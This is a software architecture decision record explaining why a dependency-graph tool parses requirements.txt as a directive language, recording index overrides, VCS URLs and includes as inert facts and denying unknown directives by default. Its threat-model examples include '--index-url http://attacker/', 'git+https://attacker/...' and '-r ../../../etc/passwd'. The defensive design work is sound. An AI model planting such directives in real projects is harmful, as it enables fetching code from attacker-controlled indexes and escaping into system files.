# ADR-0009: `requirements.txt` is parsed as a directive language with a fail-closed taxonomy — not as a manifest

**Status:** Accepted
**Date:** 2026-05-20
**Tags:** Tagged union / sum type · fail-closed default-deny · contract · security
**Related:** [ADR-0008](0008-python-depgraph-pure-parsing-no-resolution.md), [ADR-0007](0007-python-probes-hardened-parse-only-no-exec.md), [production ADR-0033](../../../production/adrs/0033-domain-modeling-discipline.md), [production ADR-0043](../../../production/adrs/0043-extension-by-addition-means-no-silent-edits.md)

## Context

`requirements.txt` is not a manifest — it is a **directive DSL**. Beyond pinned dependencies it carries `-e .` (editable installs), `-r other.txt` (includes), `git+https://...` (VCS sources), `--index-url` / `--extra-index-url` (index overrides), `--hash`, environment markers, and `--config-settings`. The best-practices design treated `requirements.txt` as "just another lockfile format," and the critic caught that this framing would **under-parse it and silently drop real dependencies** ([critique.md §Things this design missed](../critique.md); [critique.md §Attacks on the best-practices design, problem](../critique.md)) — a direct violation of production commitment 3 (honest confidence; silent staleness is the worst failure mode).

Worse, the directives are *attacker-controlled*. `--index-url http://attacker/` is an instruction to fetch from an attacker's index; `-r ../../../etc/passwd` is a path escape; `git+https://attacker/...` is a VCS fetch instruction. A naive parser that *honors* these directives turns gather into a fetch-and-execute engine. The security lens supplied the directive-language model; the synthesis adopts it decisively (CONFLICT CR-4). The [final-design.md §Risks #5](../final-design.md#risks-top-35) notes pip's directive syntax is a moving target — new directives accrue — so the taxonomy needs a fail-closed default.

## Options considered

- **Option A — parse `requirements.txt` as a flat dependency list; honor `-r` includes; ignore directives that aren't pinned deps.** **Pattern:** none — silently drops real dependencies (an unrecognized line is lost), and silently honoring `-r`/`--index-url` is a fetch instruction obeyed.
- **Option B — parse it as a directive language; honor every directive faithfully (fetch from `--index-url`, follow `git+` URLs).** **Pattern:** none — turns gather into a fetch-and-execute engine; categorically rejected.
- **Option C — parse it as a directive language; record every non-pinned-dependency directive as a typed *fact*, never act on it; default-deny on unknown directives.** **Pattern:** Tagged union (a closed `Literal` of unresolved reasons) + fail-closed default-deny.

## Decision

`requirements.txt` is parsed as a **directive language**. Every non-pinned-dependency directive is recorded as a **typed fact, never acted on**, captured in two frozen contract dataclasses pinned by the Python depgraph sub-schema:

- `-e .` / `-e <path>` → `UnresolvedDependency(reason="editable_install")`
- `git+...` / VCS URLs → `UnresolvedDependency(reason="vcs_source")`
- `--index-url` / `--extra-index-url` → `IndexOverride(url_host=...)` — **host only**, the full URL is attacker-controlled and discarded; the index URL is **never honored, never fetched**
- `-r <path>` → followed *only* if the path resolves inside the repo root; else `UnresolvedDependency(reason="out_of_tree_include")`
- **Unknown directive → `UnresolvedDependency(reason="unknown_directive")` + a warning — fail closed.** Never silently honored, never silently dropped.

The `reason` field is a closed `Literal["editable_install", "vcs_source", "out_of_tree_include", "unknown_directive"]`. The taxonomy *is* a named contract — a future directive addition is a reviewed change to it.

## Tradeoffs

| Gain | Cost |
|---|---|
| No real dependency is ever silently dropped — an unrecognized line becomes a loud `unknown_directive` fact, not a lost edge | An unknown directive yields an `unresolved` fact, not a parsed dependency — `requirements.txt` files heavy with new pip syntax produce lower-confidence graphs |
| `--index-url`/`git+`/`-e` are recorded as facts, never obeyed — gather fetches nothing, follows no VCS URL, honors no index override | Dependency-graph *completeness* on directive-heavy `requirements.txt` is explicitly sacrificed — the honest cost of refusing to resolve |
| The `reason` `Literal` is a closed sum type — a new reason is a compiler-policed `Literal` edit, and `match` exhaustiveness is checked | The taxonomy is a contract that will grow as pip's syntax grows — each growth is a reviewed change, not a free addition |
| `-r` path-escape is a repo-root containment check — `-r ../../../etc/passwd` is recorded `out_of_tree_include`, never followed | A legitimate `-r` to a sibling file *outside* the repo root is also refused — correct for the threat model, occasionally surprising for an unusual real layout |
| Default-deny on unknown directives means a future pip syntax fails *closed*, not silently | The classifier must be kept current — a long-unmaintained classifier degrades graph quality as pip evolves (but never silently, never unsafely) |

## Pattern fit

The directive taxonomy is a **tagged union / closed sum type** — the toolkit's prescription for "tag-and-dispatch": the `reason` field is a `Literal`, so `match` over `UnresolvedDependency.reason` is exhaustiveness-checked and a new reason is a compile-time prompt to handle it everywhere. The load-bearing discipline is **fail-closed default-deny**: an unrecognized directive is the dangerous case (it could be a new fetch instruction or a real dependency), and the safe default is to record it loudly as `unknown_directive` — never to silently honor it (a security hole) and never to silently drop it (a commitment-3 honest-confidence violation). The toolkit does not name "fail-closed" as a GoF pattern, but it is the security-boundary analog of "make illegal states unrepresentable": there is no code path by which an unknown directive produces a confident-but-wrong result. Storing only `url_host` (not the full attacker-controlled URL) is data minimization at the trust boundary.

## Consequences

- A hostile `requirements.txt` (`-e .`, `git+https://attacker/...`, `--index-url http://attacker/`, `-r ../../../etc/passwd`, an unknown directive) is parsed to completion; an adversarial-network monitor in the test suite asserts **zero outbound connections** and a subprocess monitor asserts **zero spawns** (edge cases #6, #7, #8, [phase-arch-design.md §Edge cases](../phase-arch-design.md#edge-cases)).
- `UnresolvedDependency` and `IndexOverride` are frozen contract dataclasses pinned by the Python depgraph sub-schema (`additionalProperties: false`) — they persist into `RepoContext` and are wired into the envelope via a `$ref`.
- A future pip directive is a reviewed change to a *named* taxonomy — the directive classifier and its `Literal` are the contract; growing it is loud.
- The directive facts are emitted as audit events into `.codegenie/context/runs/*.json` — a reviewer sees exactly which directives were refused and why.
- `requirements.txt` parsing is a moving target (Risk #5); the default-deny branch is the safety net — an unmaintained classifier degrades graph quality but never silently and never unsafely.

## Reversibility

**Medium.** The directive *taxonomy* is a contract designed to grow — adding a `reason` member is a sanctioned compiler-policed edit. The *discipline* (record-as-fact, never-act, fail-closed) is a fixed security invariant: reverting to a parser that honors `--index-url` or follows `git+` URLs is not a refactor, it is introducing a vulnerability. The classifier's directive coverage is the genuinely evolving surface; the never-act / fail-closed posture is durable.

## Evidence / sources

- [final-design.md §Components — Python dep-graph strategies](../final-design.md#components), §Data flow step 5, §Failure modes & recovery, §Risks #5, §Test plan (adversarial)
- [phase-arch-design.md §Component design — Python dep-graph strategies](../phase-arch-design.md#component-design), §Data model (`UnresolvedDependency`, `IndexOverride`), §Edge cases #6–#8, §Control flow decision point 6
- [critique.md §Things this design missed](../critique.md) — `requirements.txt` is a directive language, not data
- [production ADR-0033](../../../production/adrs/0033-domain-modeling-discipline.md) — closed sum types; [production ADR-0043](../../../production/adrs/0043-extension-by-addition-means-no-silent-edits.md) — the taxonomy as a named contract
